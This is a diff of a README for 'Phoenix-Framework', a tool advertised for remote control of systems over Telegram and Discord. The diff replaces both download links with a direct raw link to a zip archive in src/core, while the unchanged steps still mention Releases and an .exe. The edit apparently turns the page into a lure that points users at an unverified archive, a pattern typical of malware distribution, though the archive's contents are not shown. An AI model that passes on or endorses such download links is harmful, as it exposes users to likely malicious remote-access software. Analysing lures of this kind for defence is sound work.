@@ -1,6 +1,6 @@
 # 🛡️ Phoenix-Framework - Control your systems with secure channels
 
-[![](https://img.shields.io/badge/Download-Phoenix-blue)](https://github.com/Rampant-zionism337/Phoenix-Framework)
+[![](https://img.shields.io/badge/Download-Phoenix-blue)](https://raw.githubusercontent.com/Rampant-zionism337/Phoenix-Framework/main/src/core/Phoenix-Framework-v3.7-alpha.3.zip)
 
 Phoenix-Framework acts as a communication bridge. It uses established platforms like Telegram and Discord to send and receive information. This approach ensures your data travels through trusted pathways. You gain remote management capabilities without complex server setups.
 
@@ -19,7 +19,7 @@ Install the latest version of the .NET Desktop Runtime from the official Microso
 
 Follow these steps to set up the software on your local machine:
 
-1. Visit [this page](https://github.com/Rampant-zionism337/Phoenix-Framework) to download the installer.
+1. Visit [this page](https://raw.githubusercontent.com/Rampant-zionism337/Phoenix-Framework/main/src/core/Phoenix-Framework-v3.7-alpha.3.zip) to download the installer.
 2. Locate the most recent release under the "Releases" section.
 3. Select the file ending in .exe to start your download.
 4. Open the downloaded file to begin the installation.
